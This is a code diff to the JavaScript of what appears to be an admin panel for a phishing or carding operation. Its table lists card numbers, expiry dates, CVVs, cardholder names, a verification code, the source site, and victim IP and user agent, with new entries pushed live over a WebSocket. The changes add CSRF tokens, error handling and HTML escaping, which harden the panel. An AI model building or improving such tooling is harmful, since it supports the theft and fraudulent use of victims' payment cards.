@@ -5,6 +5,22 @@ const closeBtn = document.querySelector('.close');
 const refreshBtn = document.getElementById('refreshBtn');
 const tableBody = document.getElementById('tableBody');
 
+// Получение CSRF токена из cookie
+function getCsrfToken() {
+    return document.cookie.split('; ')
+        .find(row => row.startsWith('XSRF-TOKEN='))
+        ?.split('=')[1];
+}
+
+// Базовые настройки для fetch запросов
+const fetchConfig = {
+    credentials: 'include',
+    headers: {
+        'CSRF-Token': getCsrfToken(),
+        'Content-Type': 'application/json'
+    }
+};
+
 // Обработчики событий
 qrBtn.addEventListener('click', () => {
     qrModal.style.display = 'block';
@@ -27,7 +43,8 @@ refreshBtn.addEventListener('click', refreshData);
 function refreshQRCodes() {
     const qrImages = document.querySelectorAll('.qr-section img');
     qrImages.forEach((img, index) => {
-        img.src = `/qr/${index + 1}?t=${new Date().getTime()}`;
+        const timestamp = new Date().getTime();
+        img.src = `/qr/${index + 1}?t=${timestamp}`;
     });
 }
 
@@ -48,6 +65,10 @@ async function uploadQR(siteNumber) {
     try {
         const response = await fetch('/admin/upload-qr', {
             method: 'POST',
+            credentials: 'include',
+            headers: {
+                'CSRF-Token': getCsrfToken()
+            },
             body: formData
         });
 
@@ -81,23 +102,40 @@ function showNotification(message, type = 'info') {
 // Функция обновления данных таблицы
 async function refreshData() {
     try {
-        const response = await fetch('/api/data');
+        const response = await fetch('/api/data', {
+            ...fetchConfig,
+            method: 'GET'
+        });
+        
+        if (!response.ok) {
+            throw new Error(`HTTP error! status: ${response.status}`);
+        }
+        
         const data = await response.json();
         
         tableBody.innerHTML = '';
         data.forEach(item => {
             const row = document.createElement('tr');
+            const sanitizedData = Object.fromEntries(
+                Object.entries(item).map(([key, value]) => [
+                    key,
+                    String(value || '-').replace(/[<>]/g, c => 
+                        ({ '<': '&lt;', '>': '&gt;' }[c])
+                    )
+                ])
+            );
+            
             row.innerHTML = `
-                <td>${item.id}</td>
-                <td>${item.cc_num}</td>
-                <td>${item.exp}</td>
-                <td>${item.cvv}</td>
-                <td>${item.cardholder}</td>
-                <td>${item.code || '-'}</td>
-                <td>${item.site}</td>
-                <td>${item.ip}</td>
-                <td>${item.ua}</td>
-                <td>${item.referer}</td>
+                <td>${sanitizedData.id}</td>
+                <td>${sanitizedData.cc_num}</td>
+                <td>${sanitizedData.exp}</td>
+                <td>${sanitizedData.cvv}</td>
+                <td>${sanitizedData.cardholder}</td>
+                <td>${sanitizedData.code || '-'}</td>
+                <td>${sanitizedData.site}</td>
+                <td>${sanitizedData.ip}</td>
+                <td>${sanitizedData.ua}</td>
+                <td>${sanitizedData.referer}</td>
             `;
             tableBody.appendChild(row);
         });
@@ -107,8 +145,17 @@ async function refreshData() {
     }
 }
 
-// Инициализация WebSocket
-const socket = io();
+// Инициализация WebSocket с CSRF токеном
+const socket = io({
+    withCredentials: true,
+    transportOptions: {
+        polling: {
+            extraHeaders: {
+                'CSRF-Token': getCsrfToken()
+            }
+        }
+    }
+});
 
 socket.on('connect', () => {
     console.log('Connected to WebSocket server');
@@ -123,6 +170,13 @@ socket.on('newData', () => {
 socket.on('error', (error) => {
     showNotification('Ошибка WebSocket соединения', 'error');
     console.error('WebSocket error:', error);
+});
+
+// Обработка ошибок CSRF
+window.addEventListener('fetch-error', (e) => {
+    if (e.detail.status === 403) {
+        showNotification('Ошибка безопасности. Пожалуйста, обновите страницу.', 'error');
+    }
 });
 
 // Начальная загрузка данных
